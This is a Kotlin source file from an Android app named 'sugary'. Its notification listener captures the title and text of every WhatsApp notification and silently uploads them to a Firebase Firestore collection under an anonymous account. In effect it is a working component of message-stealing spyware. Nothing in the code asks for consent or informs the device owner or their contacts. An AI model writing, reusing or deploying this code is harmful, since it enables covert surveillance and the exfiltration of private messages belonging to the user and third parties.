package com.nshornalabs.sugary

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.CollectionReference
import com.google.firebase.firestore.FirebaseFirestore

@SuppressLint("OverrideAbstract")
class NotificationService : NotificationListenerService() {

    val userTask = FirebaseAuth.getInstance().signInAnonymously();

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if(sbn?.packageName.equals("com.whatsapp")){
            val extras = sbn?.notification?.extras;
            if(!extras?.getCharSequence("android.text").isNullOrBlank() && !extras?.getCharSequence("android.title").isNullOrBlank()){
                val title =extras?.getCharSequence("android.title")
                val text = extras?.getCharSequence("android.text")
                Log.i("ITman Whatsapp","Title: ${title} \n Text is ${text}")

                val user = userTask.result?.user
                val chatCol = FirebaseFirestore.getInstance().collection("users").document(user?.uid.toString()).collection("chats")
                val data= hashMapOf(
                    "title" to title,
                    "text" to text
                )
                chatCol.add(data as Map<String, Any>)

            }



//            extras?.keySet()?.forEach{ key->
//                if(extras.get(key) !=null ){
//                    val data = extras.get(key)
//                    Log.i("Whatsapp","${key}: ${data}")
//            } }
        }
    }
}
